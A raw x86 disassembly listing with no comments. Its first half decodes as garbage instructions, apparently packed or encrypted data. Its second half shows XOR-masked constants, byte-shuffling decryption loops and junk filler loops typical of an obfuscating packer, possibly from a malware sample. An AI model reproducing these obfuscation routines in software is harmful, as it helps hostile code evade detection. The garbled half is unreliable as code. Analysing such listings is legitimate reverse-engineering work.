  407fba:	add    BYTE PTR [ebx-0x2dac1985],cl
  407fc0:	or     eax,0x547d1bf9
  407fc5:	test   DWORD PTR [ebp+0x50],ecx
  407fc8:	enter  0x6ca2,0xfb
  407fcc:	mov    ds:0x297b7c47,eax
  407fd1:	push   0xfffffffe
  407fd3:	fmulp  st(7),st
  407fd5:	pop    edx
  407fd6:	out    dx,al
  407fd7:	dec    ecx
  407fd8:	(bad)  
  407fd9:	pop    edx
  407fda:	les    edx,FWORD PTR [eax-0x7d]
  407fdd:	sub    DWORD PTR [edi+0x71b3d3c6],edi
  407fe3:	mov    ch,0x74
  407fe5:	xchg   edi,eax
  407fe6:	fld    TBYTE PTR [edi-0x33c92a08]
  407fec:	jo     0x408062
  407fee:	sbb    DWORD PTR [edx-0x471e6f8e],edx
  407ff4:	lahf   
  407ff5:	lea    edi,[ebp-0x1d]
  407ff8:	je     0x407f9c
  407ffa:	rcl    BYTE PTR [esi-0x30],1
  407ffd:	mov    bl,0x3d
  407fff:	xor    al,0xbe
  408001:	bound  edi,QWORD PTR [edi+0x7d834d9d]
  408007:	adc    esp,edx
  408009:	ss ret 
  40800b:	fs jle 0x407ffd
  40800e:	lock (bad) 
  408010:	fdivp  st(5),st
  408012:	test   BYTE PTR [ebx+0x7],0xae
  408016:	aam    0xd2
  408018:	ins    DWORD PTR es:[edi],dx
  408019:	dec    BYTE PTR [eax+edx*4+0x62e9160a]
  408020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408021:	adc    al,bh
  408023:	lahf   
  408024:	ds pop edi
  408026:	jbe    0x407fdf
  408028:	repz addr16 pop ds
  40802b:	(bad)  
  40802c:	sahf   
  40802d:	add    eax,0x674e0b63
  408032:	sub    bh,BYTE PTR ds:0x32c91791
  408038:	add    dh,bh
  40803a:	mov    cl,0xca
  40803c:	inc    edx
  40803d:	cmp    dh,BYTE PTR [ecx-0x23]
  408040:	adc    ecx,DWORD PTR ds:0x323830d3
  408046:	fstp   DWORD PTR [eax+0x1]
  408049:	xchg   edx,eax
  40804a:	repz aas 
  40804c:	lahf   
  40804d:	or     DWORD PTR [edx+esi*1+0x6d],0xa
  408052:	out    dx,eax
  408053:	outs   dx,BYTE PTR ds:[esi]
  408054:	add    eax,0xcbab91fb
  408059:	push   ebp
  40805a:	aam    0xb6
  40805c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40805d:	push   ebp
  40805e:	sub    eax,0x726da10d
  408063:	cmc    
  408064:	mov    dh,0x29
  408066:	or     bh,BYTE PTR [bp+si-0x36]
  40806a:	aad    0xe9
  40806c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40806d:	add    ecx,DWORD PTR [esi-0x6d]
  408070:	or     al,BYTE PTR [ebx+0x46]
  408073:	xlat   BYTE PTR ds:[ebx]
  408074:	or     DWORD PTR [edi],ebp
  408076:	jl     0x4080d5
  408078:	adc    eax,0x210b472c
  40807d:	test   DWORD PTR [ebx+0x46c33d9f],ebx
  408083:	test   eax,0x182448da
  408088:	rcl    ecx,1
  40808a:	mov    dl,0x5c
  40808c:	in     eax,dx
  40808d:	adc    BYTE PTR [esi],ah
  40808f:	mov    dh,0x42
  408091:	xchg   esp,eax
  408092:	jg     0x4080a1
  408094:	icebp  
  408095:	call   0xc1f:0x24afcfcc
  40809c:	scas   eax,DWORD PTR es:[edi]
  40809d:	mov    bl,0xb8
  40809f:	or     eax,0xad52b8f
  4080a4:	lods   al,BYTE PTR ds:[esi]
  4080a5:	fnstenv [esi]
  4080a7:	push   ds
  4080a8:	rcl    esp,1
  4080aa:	sub    al,BYTE PTR [edi+0x377b6688]
  4080b0:	mov    al,0x74
  4080b2:	int    0xd6
  4080b4:	aaa    
  4080b5:	cwde   
  4080b6:	or     esp,DWORD PTR [ecx]
  4080b8:	mov    ebp,0xbc7843a8
  4080bd:	(bad)  
  4080bf:	idiv   dh
  4080c1:	jns    0x40810b
  4080c3:	loop   0x4080a8
  4080c5:	or     al,0x68
  4080c7:	pusha  
  4080c8:	mov    DWORD PTR [eax+0x12cac188],edi
  4080ce:	sub    esp,DWORD PTR [ebx]
  4080d0:	xchg   edx,eax
  4080d1:	aam    0x75
  4080d3:	ins    DWORD PTR es:[edi],dx
  4080d4:	mul    ebx
  4080d6:	and    ebp,edi
  4080d8:	ja     0x4080d7
  4080da:	popa   
  4080db:	and    eax,0xb09ceef1
  4080e0:	jmp    0xf323:0xbdf0aad2
  4080e7:	mov    bh,ah
  4080e9:	mov    esi,0x9587dfa
  4080ee:	sub    al,0x95
  4080f0:	fdivr  DWORD PTR [eax]
  4080f2:	repz lds ebp,FWORD PTR [eax+0x41]
  4080f6:	outs   dx,DWORD PTR ds:[esi]
  4080f7:	int3   
  4080f8:	push   ebx
  4080f9:	test   al,0x73
  4080fb:	sbb    BYTE PTR [eax+0x7a],0x53
  4080ff:	(bad)  [edx-0x2e]
  408102:	call   0x920c:0xeb388fe5
  408109:	sbb    DWORD PTR [ecx],ebp
  40810b:	xor    dl,bl
  40810d:	and    eax,0x67d6c42a
  408112:	xor    DWORD PTR [edx-0x6d49535e],0x1
  408119:	ins    DWORD PTR es:[edi],dx
  40811a:	test   DWORD PTR [edi+0x4f7463f7],edx
  408120:	pop    esi
  408121:	fs popf 
  408123:	push   edx
  408124:	push   ebx
  408125:	mov    ecx,0x7c7e9fa0
  40812a:	jns    0x408111
  40812c:	cmp    al,0xde
  40812e:	push   edx
  40812f:	int    0xa8
  408131:	mov    ecx,0xb7557580
  408136:	mov    eax,0x61c766c5
  40813b:	sub    esi,DWORD PTR ds:0xe2bb20b5
  408141:	xor    ebx,ebp
  408143:	inc    ebp
  408144:	mov    eax,DWORD PTR [ebp+0x6f59c2da]
  40814a:	out    dx,al
  40814b:	sbb    ecx,eax
  40814d:	push   es
  40814e:	dec    edx
  40814f:	inc    ecx
  408150:	clc    
  408151:	fstp   st(6)
  408153:	xchg   esi,eax
  408154:	pop    esp
  408155:	sbb    BYTE PTR [ebx-0x5590de5c],cl
  40815b:	jmp    DWORD PTR [ecx-0x42]
  40815e:	fistp  QWORD PTR [edi+0x7]
  408161:	push   cs
  408162:	mov    esi,0x5bf2bc44
  408167:	les    edi,FWORD PTR [esi]
  408169:	jno    0x40814e
  40816b:	fcomp  QWORD PTR [ebp-0x24fd3ef1]
  408171:	fsub   DWORD PTR [eax-0x405a20e3]
  408177:	pushf  
  408178:	dec    edi
  408179:	xor    ebp,DWORD PTR [edx+eax*2-0x58b8ca8e]
  408180:	loope  0x40812e
  408182:	mov    esi,esp
  408184:	sti    
  408185:	adc    DWORD PTR [eax+0x5f],esp
  408188:	fs dec ebx
  40818a:	and    ch,BYTE PTR [esi-0x6d]
  40818d:	mov    edx,0x808ab21a
  408192:	push   ecx
  408193:	js     0x408142
  408195:	or     al,ah
  408197:	mov    al,0x95
  408199:	or     ebp,0x4d223818
  40819f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081a0:	sar    ebp,0xbb
  4081a3:	jb     0x408155
  4081a5:	lea    edi,[ebx-0x1a]
  4081a8:	mov    esi,0xb77aeea8
  4081ad:	rcl    DWORD PTR [esi-0xf],1
  4081b0:	cmp    DWORD PTR [eax-0x6d],ebx
  4081b3:	frstor [esi]
  4081b5:	jae    0x408200
  4081b7:	call   FWORD PTR ds:0xb48b5611
  4081bd:	js     0x4081f9
  4081bf:	inc    eax
  4081c0:	imul   ecx,DWORD PTR [edx],0xffffffc9
  4081c3:	ds sti 
  4081c5:	call   0x50dde320
  4081ca:	xor    al,0x23
  4081cc:	mov    edi,0x158467bd
  4081d1:	nop
  4081d2:	sub    ebx,DWORD PTR [edi+0x6]
  4081d5:	add    BYTE PTR [edx-0x30e12ab2],0x2b
  4081dc:	lods   al,BYTE PTR ds:[esi]
  4081dd:	push   es
  4081de:	push   esi
  4081df:	push   edx
  4081e0:	stos   BYTE PTR es:[edi],al
  4081e1:	popf   
  4081e2:	(bad)  
  4081e3:	adc    DWORD PTR [esi],edi
  4081e5:	popf   
  4081e6:	pop    esi
  4081e7:	pop    ebx
  4081e8:	mov    bh,0x21
  4081ea:	push   es
  4081eb:	jmp    0x49a7ed78
  4081f0:	lahf   
  4081f1:	cmp    al,0x94
  4081f3:	mov    dl,0x92
  4081f5:	outs   dx,DWORD PTR ds:[esi]
  4081f6:	(bad)  
  4081f7:	push   ecx
  4081f8:	sub    BYTE PTR [eax],0x53
  4081fb:	jnp    0x40827a
  4081fd:	inc    eax
  4081fe:	pop    ebp
  4081ff:	in     eax,0x20
  408201:	xor    eax,0x7ba04df3
  408206:	outs   dx,BYTE PTR ds:[esi]
  408207:	mov    ch,0x5d
  408209:	or     cl,BYTE PTR ds:[eax]
  40820c:	jp     0x4081d3
  40820e:	inc    ecx
  40820f:	adc    esp,DWORD PTR [esp+ecx*8-0x29ec6a93]
  408216:	fwait
  408217:	test   BYTE PTR [ebp+0x46],cl
  40821a:	xor    DWORD PTR [ebp-0x5a],eax
  40821d:	add    al,0xea
  40821f:	retf   
  408220:	out    0x93,eax
  408222:	pop    esi
  408223:	lds    edx,FWORD PTR [edi]
  408225:	xor    al,0x3a
  408227:	call   FWORD PTR [edx]
  408229:	not    eax
  40822b:	cmp    esp,esi
  40822d:	dec    ecx
  40822e:	dec    eax
  40822f:	mov    al,ds:0x5d3be75e
  408234:	out    0xff,eax
  408236:	and    al,BYTE PTR [ecx+0x7e]
  408239:	in     al,dx
  40823a:	rcl    DWORD PTR [ebp+0x375eed84],1
  408240:	push   cs
  408241:	ret    0xab61
  408244:	adc    bh,al
  408246:	aad    0xa0
  408248:	stc    
  408249:	sub    DWORD PTR [edi+0x5d832654],edx
  40824f:	add    eax,0x486b5370
  408254:	mov    bh,BYTE PTR [edx]
  408256:	scas   al,BYTE PTR es:[edi]
  408257:	jl     0x40821d
  408259:	jmp    0x397c4e4b
  40825e:	ret    
  40825f:	outs   dx,DWORD PTR ds:[esi]
  408260:	push   esp
  408261:	ds cli 
  408263:	fisub  DWORD PTR [edx-0x34]
  408266:	sub    ah,dh
  408268:	xchg   ebp,eax
  408269:	add    al,0x8b
  40826b:	mov    ebx,0x2164acc3
  408270:	repz call 0xf394526a
  408276:	div    DWORD PTR [edi-0x5e41a633]
  40827c:	inc    edx
  40827d:	inc    esp
  40827e:	sar    BYTE PTR [eax],0x3a
  408281:	push   es
  408282:	mov    edi,0x3c75d920
  408287:	jo     0x40824d
  408289:	dec    ecx
  40828a:	add    DWORD PTR [esi-0x6b4a3caa],eax
  408290:	dec    ebp
  408291:	add    eax,0x66df4cba
  408296:	xor    BYTE PTR [edx+0x48],al
  408299:	mov    cl,0x33
  40829b:	leave  
  40829c:	aam    0x75
  40829e:	jmp    0x9386f2c2
  4082a3:	mov    bh,0xe6
  4082a5:	mov    BYTE PTR [ebx],0x44
  4082a8:	mov    ebx,0x425d267e
  4082ad:	push   esp
  4082ae:	and    eax,DWORD PTR [ebp-0x3258aaec]
  4082b4:	cwde   
  4082b5:	shl    BYTE PTR [eax+edx*4+0x69],cl
  4082b9:	sub    edx,ebx
  4082bb:	pop    edx
  4082bc:	out    dx,al
  4082bd:	adc    eax,0xe33644d6
  4082c2:	(bad)  
  4082c3:	lock mov bl,al
  4082c6:	ret    0x1d15
  4082c9:	stos   DWORD PTR es:[edi],eax
  4082ca:	mov    esp,0xe5f734bc
  4082cf:	fcomip st,st(4)
  4082d1:	lea    ecx,[edi+0x44]
  4082d4:	loop   0x4082b3
  4082d6:	mov    DWORD PTR [edx-0x45],ecx
  4082d9:	pop    esp
  4082da:	pop    ebp
  4082db:	jl     0x408285
  4082dd:	inc    edx
  4082de:	pop    edx
  4082df:	pop    ss
  4082e0:	ret    
  4082e1:	sbb    eax,0x368291dd
  4082e6:	mov    ch,dh
  4082e8:	add    bh,dl
  4082ea:	in     al,0x3
  4082ec:	call   FWORD PTR [eax+0x27]
  4082ef:	mov    WORD PTR [edx],cs
  4082f1:	lods   al,BYTE PTR ds:[esi]
  4082f2:	or     al,0x78
  4082f4:	jmp    0x549:0x98a37e86
  4082fb:	lea    esp,[eax+ecx*8-0x574fd267]
  408302:	jb     0x408292
  408304:	mov    dl,0x2d
  408306:	mov    edx,0xb1e6c1b5
  40830b:	inc    ecx
  40830c:	mov    dh,0xec
  40830e:	sub    bl,BYTE PTR [esi-0x2054d6dd]
  408314:	mov    eax,ds:0xbe13c12
  408319:	stos   BYTE PTR es:[edi],al
  40831a:	cmp    DWORD PTR [esi+0x37],0xffffffeb
  40831e:	push   cs
  40831f:	imul   ebx,esp,0x8121dba9
  408325:	stos   DWORD PTR es:[edi],eax
  408326:	jecxz  0x4082e8
  408328:	adc    BYTE PTR [ecx],cl
  40832a:	aaa    
  40832b:	dec    eax
  40832c:	out    0x43,eax
  40832e:	push   ss
  40832f:	cmp    eax,0xbba0f7fd
  408334:	pop    ebx
  408335:	xor    eax,0x2fdb6c0f
  40833a:	sbb    DWORD PTR [edx-0x21],ebx
  40833d:	cwde   
  40833e:	dec    eax
  40833f:	hlt    
  408340:	pop    eax
  408341:	inc    BYTE PTR [ecx+0x60]
  408344:	or     bl,BYTE PTR [edi+0x72]
  408347:	cdq    
  408348:	fdivr  QWORD PTR [edx]
  40834a:	out    0x5d,al
  40834c:	inc    ebp
  40834d:	jecxz  0x408367
  40834f:	or     eax,DWORD PTR [esi]
  408351:	addr16 pop edx
  408353:	sub    al,dl
  408355:	pop    esp
  408356:	add    cl,BYTE PTR gs:[edx-0x115d647a]
  40835d:	mov    bl,0xee
  40835f:	mov    WORD PTR [ebx-0x1e],?
  408362:	ja     0x4082ef
  408364:	push   edi
  408365:	mov    edx,0x2e8a3184
  40836a:	daa    
  40836b:	mov    eax,ds:0x883d2811
  408370:	jne    0x40833c
  408372:	mov    ds:0x12a5a276,eax
  408377:	mov    dl,0x5d
  408379:	loop   0x408387
  40837b:	lods   al,BYTE PTR ds:[esi]
  40837c:	fwait
  40837d:	fs jmp 0x9dc45a76
  408383:	or     ebp,ecx
  408385:	jns    0x4083a1
  408387:	ret    0xe2a1
  40838a:	in     eax,dx
  40838b:	mov    ecx,0xf7734736
  408390:	jnp    0x4083c7
  408392:	mov    edi,DWORD PTR [ecx-0x14]
  408395:	sub    eax,0x46a5e733
  40839a:	out    dx,eax
  40839b:	test   BYTE PTR [ebx-0x4b],ah
  40839e:	sub    ecx,DWORD PTR [edx+0x43c3409e]
  4083a4:	mov    ah,0xb2
  4083a6:	pop    ebp
  4083a7:	lods   al,BYTE PTR ds:[esi]
  4083a8:	sahf   
  4083a9:	scas   al,BYTE PTR es:[edi]
  4083aa:	lock (bad) 
  4083ac:	push   cs
  4083ad:	fdiv   st(5),st
  4083af:	jge    0x40834e
  4083b1:	cmp    al,0x9b
  4083b3:	ret    
  4083b4:	or     dh,0x8d
  4083b7:	aam    0x42
  4083b9:	mov    edx,0xd97caf47
  4083be:	iret   
  4083bf:	add    bh,bh
  4083c1:	loope  0x40838c
  4083c3:	cdq    
  4083c4:	jl     0x4083a6
  4083c6:	out    0xa1,eax
  4083c8:	mov    dl,ch
  4083ca:	gs aaa 
  4083cc:	cwde   
  4083cd:	aas    
  4083ce:	test   eax,0x6f46a328
  4083d3:	pop    es
  4083d4:	and    BYTE PTR [edi],0x46
  4083d7:	inc    ebx
  4083d8:	jg     0x408383
  4083da:	(bad)  
  4083db:	cmp    bh,al
  4083dd:	sub    ebp,DWORD PTR [ebx-0x5d29f0b9]
  4083e3:	sub    al,0xc2
  4083e5:	cld    
  4083e6:	ret    0x19f
  4083e9:	or     al,0xe8
  4083eb:	(bad)  
  4083ec:	mov    edx,DWORD PTR [esi-0x14]
  4083ef:	adc    al,0x3a
  4083f1:	add    dl,BYTE PTR [ebx+0x7a8ea93]
  4083f7:	push   0xffffffd3
  4083f9:	popf   
  4083fa:	hlt    
  4083fb:	test   al,0x6b
  4083fd:	enter  0x7830,0xa6
  408401:	ins    BYTE PTR es:[edi],dx
  408402:	push   edi
  408403:	xchg   ebx,eax
  408404:	cmc    
  408405:	xor    esi,edi
  408407:	out    dx,al
  408408:	leave  
  408409:	push   edi
  40840a:	jle    0x408483
  40840c:	in     al,0x67
  40840e:	call   0x83cf3a6
  408413:	mov    eax,ds:0xd48e25b3
  408418:	mov    ah,0x21
  40841a:	iret   
  40841b:	arpl   WORD PTR [ecx],si
  40841d:	sbb    eax,0x5718c488
  408422:	call   0x534b87f2
  408427:	je     0x408474
  408429:	dec    ebx
  40842a:	js     0x408472
  40842c:	retf   0xa2a4
  40842f:	ret    
  408430:	out    0xb7,eax
  408432:	pop    eax
  408433:	and    ebp,DWORD PTR [ebx*2+0x65d1efaf]
  40843a:	cmp    al,0xec
  40843c:	dec    ebp
  40843d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40843e:	push   eax
  40843f:	ja     0x40845d
  408441:	pop    esp
  408442:	(bad)  
  408443:	mov    ebx,esp
  408445:	inc    edx
  408446:	ret    
  408447:	sub    DWORD PTR [eax+eiz*4],ebx
  40844a:	xor    BYTE PTR [ecx-0x65],ch
  40844d:	pusha  
  40844e:	add    dl,BYTE PTR [edx+ebp*2-0x3d6b459e]
  408455:	mov    DWORD PTR [edx-0x34],ebp
  408458:	in     al,dx
  408459:	adc    DWORD PTR [edi],0x5
  40845c:	test   DWORD PTR [ebx+edi*1+0x6f],esp
  408460:	mov    DWORD PTR [edx-0x15eaf471],esi
  408466:	scas   eax,DWORD PTR es:[edi]
  408467:	xchg   esi,eax
  408468:	pop    eax
  408469:	mov    al,BYTE PTR [eax+edx*1]
  40846c:	mov    BYTE PTR [ebp-0x1],al
  40846f:	mov    eax,DWORD PTR [ebp-0x30]
  408472:	mov    edx,DWORD PTR [ebp-0xc]
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
